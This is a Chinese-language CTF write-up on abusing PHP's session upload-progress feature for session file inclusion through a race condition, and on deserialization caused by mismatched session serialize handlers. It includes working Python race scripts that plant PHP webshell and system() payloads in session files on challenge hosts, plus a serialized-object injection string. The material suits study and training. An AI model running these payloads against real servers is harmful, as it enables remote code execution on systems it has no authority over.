### 前言

本文是利用`PHP_SESSION_UPLOAD_PROGRESS`进行文件包含和反序列化的总结。

也就是关于php-session的文件包含和反序列化

### session的简介

>session被称为“会话控制”,Session 对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的 Web 页之间跳转时，存储在 Session 对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。当用户请求来自应用程序的 Web 页时，如果该用户还没有会话，则 Web 服务器将自动创建一个 Session 对象。当会话过期或被放弃后，服务器将终止该会话。Session 对象最常见的一个用法就是存储用户的首选项。例如，如果用户指明不喜欢查看图形，就可以将该信息存储在 Session 对象中.
>
>当第一次访问网站时，Seesion_start()函数就会创建一个唯一的Session ID，并自动通过HTTP的响应头，将这个Session ID保存到客户端Cookie中。同时，也在服务器端创建一个以Session ID命名的文件，用于保存这个用户的会话信息。当同一个用户再次访问这个网站时，也会自动通过HTTP的请求头将Cookie中保存的Seesion ID再携带过来，这时Session_start()函数就不会再去分配一个新的Session ID，而是在服务器的硬盘中去寻找和这个Session ID同名的Session文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的
>
>
>
>session和cookie的联系:
>
>cookie中的PHPSESSID将作为服务器session的文件名sess__xxx,浏览器直接根据这个去服务器中找对应的sessid





###  PHP中session的存储方式

直接放[y4爷写的总结吧](https://blog.csdn.net/solitudi/article/details/107750063?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163685897916780271562962%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=163685897916780271562962&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-2-107750063.pc_v2_rank_blog_default&utm_term=session&spm=1018.2226.3001.4450)

php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项session.save_handler来进行确定的，默认是以文件的方式存储。

| **php_serialize** | **经过serialize()函数序列化数组**                        |
| ----------------- | -------------------------------------------------------- |
| php               | 键名+竖线+经过serialize()函数处理的值                    |
| php_binary        | 键名的长度对应的ascii字符+键名+serialize()函数序列化的值 |

###  php.ini中的一些配置



>session.save_path="" --设置session的存储路径
>session.save_handler=""–设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)
>session.auto_start boolen–指定会话模块是否在请求开始时启动一个会话默认为0不启动
>session.serialize_handler string–定义用来序列化/反序列化的处理器名字。默认使用php

###  php中的session.upload_progress

版本：php5.4以上

```
在php.ini有以下几个默认选项

1. session.upload_progress.enabled = on
2. session.upload_progress.cleanup = on
3. session.upload_progress.prefix = "upload_progress_"
4. session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"
5. session.upload_progress.freq = "1%"
6. session.upload_progress.min_freq = "1"

其中
enabled=on表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；

cleanup=on表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；

name当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；

prefix+name将表示为session中的键名
```

session文件包含和反序列化就是利用`session.upload_progress`,可以将上传的文件信息保存在session中.

###  文件包含

一般默认配置`session.upload_progress.cleanup = on`导致文件上传后，session文件内容立即清空，我们需要进行条件竞争.如果为`off`,就不需要利用条件竞争.

脚本：

文件上传

```python
import requests
import threading

session = requests.session()
sess = 'zzy' #上传文件的PHPSESSION的ID
url1 = "http://74a4727a-4f34-4d21-bd52-95c73db10eed.challenge.ctf.show:8080/"
url2 = "http://74a4727a-4f34-4d21-bd52-95c73db10eed.challenge.ctf.show:8080/upload/"
data1 = {
    'PHP_SESSION_UPLOAD_PROGRESS': '<?php system("tac ../f*");?>'# 传入的恶意代码
}
file = {
    'file': 'zzy'
}
cookies = {
    'PHPSESSID': sess
}


def write():
    while True:
        r = session.post(url1, data=data1, files=file, cookies=cookies)


def read():
    while True:
        r = session.get(url2)
        if 'flag' in r.text:
            print(r.text)


threads = [threading.Thread(target=write),
           threading.Thread(target=read)]
for t in threads:
    t.start()
```

文件包含

```python
import requests
import threading
import sys

session = requests.session()
sess = 'zzy'
url1 = "http://0bd266c6-b013-4a9a-97b5-2a644856a1e5.challenge.ctf.show:8080/"
url2 = 'http://0bd266c6-b013-4a9a-97b5-2a644856a1e5.challenge.ctf.show:8080/?file=/tmp/sess_' + sess

# file后为phpsession的路径
data1 = {
    'PHP_SESSION_UPLOAD_PROGRESS': '<?php eval($_POST[1]);?>'
}
data2 = {
    '1': 'system("cat f*");'
}
file = {
    'file': 'abc'
}
cookies = {
    'PHPSESSID': sess
}


def write():
    while True:
        r = session.post(url1, data=data1, files=file, cookies=cookies)


def read():
    while True:
        r = session.post(url2, data=data2)
        if 'ctfshow{' in r.text:
            print(r.text)


threads = [threading.Thread(target=write),
           threading.Thread(target=read)]
for t in threads:
    t.start()

```

上面两个脚本的区别

```
文件上传，用url1的内容，post向phpsession中爆flag，然后通过访问url2，可以触发upload下的index.php,然后到.user.ini,再到png中去include PHPSESSION的内容，执行命令。如果是传入小马，url2需要post内容，执行命令

文件包含：url1的内容，来向phpsession中写入小马，然后，通过url2的file的参数去包含phpsession的路径，加上url2的post来执行命令，从而得到flag。

```



关于文件包含还有个脚本

```python
import io
import requests
import threading
url = 'http://challenge-cfd946d2e06b103c.sandbox.ctfhub.com:10800'

def write(session):
    data = {
        'PHP_SESSION_UPLOAD_PROGRESS': '<?php system("cat /flag_is_here_not_are_but_you_find");?>dotasts'
    }
    while True:
        f = io.BytesIO(b'a' * 1024 * 10)
        response = session.post(url,cookies={'PHPSESSID': 'flag'}, data=data, files={'file': ('dota.txt', f)})
def read(session):
    while True:
        response = session.get(url+'?file=/tmp/sess_flag')
        if 'dotasts' in response.text:
            print(response.text)
            break
        else:
            print('retry')

if __name__ == '__main__':
    session = requests.session()
    write = threading.Thread(target=write, args=(session,))
    write.daemon = True
    write.start()
    read(session)
```

例子有[CTF-第五空间](https://blog.csdn.net/unexpectedthing/article/details/120507688?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163685804816780366557380%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=163685804816780366557380&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-1-120507688.pc_v2_rank_blog_default&utm_term=%E7%AC%AC%E4%BA%94&spm=1018.2226.3001.4450)

ctfshow有个题也可以这么做

```php
<?php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    $file = str_replace(".", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);

```

利用条件：

```
1. 存在文件包含漏洞

2. 知道session文件存放路径，可以尝试默认路径

3. 具有读取和写入session文件的权限
```

###  反序列化

####  $_SESSION变量直接可控

php引擎的存储格式是`键名|serialized_string`，而php_serialize引擎的存储格式是`serialized_string`。如果程序使用两个引擎来分别处理的话就会出现问题

实验：

1.php:

```php
<?php
ini_set('session.serialize_handler', 'php_serialize');
session_start();
$_SESSION['z3eyond'] = $_GET['a'];
var_dump($_SESSION);
```

2.php

```php
<?php
ini_set('session.serialize_handler', 'php');
session_start();
class test{
    public $name;
    function __wakeup(){
        echo $this->name;
    }
}

```

首先访问1.php，传入参数`a=|O:4:"test":1:{s:4:"name";s:7:"z3eyond";}`再访问2.php，注意不要忘记`|`

会发现2.php出现了`z3eyond`

这是因为`1.php`是使用`php_serialize`引擎处理，因此只会把`'|'`当做一个正常的字符。然后访问`2.php`，由于用的是`php`引擎，因此遇到`'|'`时会将之看做键名与值的分割符，从而造成了歧义，导致其在解析session文件时直接对`'|'`后的值进行反序列化处理。

为什么1.php可以触发2.php的__wakeup()?

```
我的理解是，1.php中session_start()开始会话，写入了session文件，然后访问2.php，session_start(),读取了session文件。而由于引擎不一样，从而引发了__wakeup的不同。
```

关于session_start():

```
当会话自动开始或者通过 session_start() 手动开始的时候， PHP 内部会调用会话管理器的 open 和 read 回调函数。 会话管理器可能是 PHP 默认的， 也可能是扩展提供的（SQLite 或者 Memcached 扩展）， 也可能是通过 session_set_save_handler() 设定的用户自定义会话管理器。 通过 read 回调函数返回的现有会话数据（使用特殊的序列化格式存储），PHP 会自动反序列化数据并且填充 $_SESSION 超级全局变量

```

所以我们可以通过这种来构造攻击.

CTF题目:

[bestphp‘revenge](https://blog.csdn.net/unexpectedthing/article/details/122887406)

####  $_SESSION变量不可控

[参考这个CTF题](https://blog.csdn.net/solitudi/article/details/108861664?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163686817516780366522653%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=163686817516780366522653&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-4-108861664.pc_v2_rank_blog_default&utm_term=session&spm=1018.2226.3001.4450)

[CTFSHOW新春欢乐赛web7](https://blog.csdn.net/unexpectedthing/article/details/122840053)

###  参考链接

```
https://www.freebuf.com/vuls/202819.html
https://blog.csdn.net/solitudi/article/details/113588692?spm=1001.2014.3001.5502
https://y4tacker.blog.csdn.net/article/details/113588692?spm=1001.2014.3001.5502
```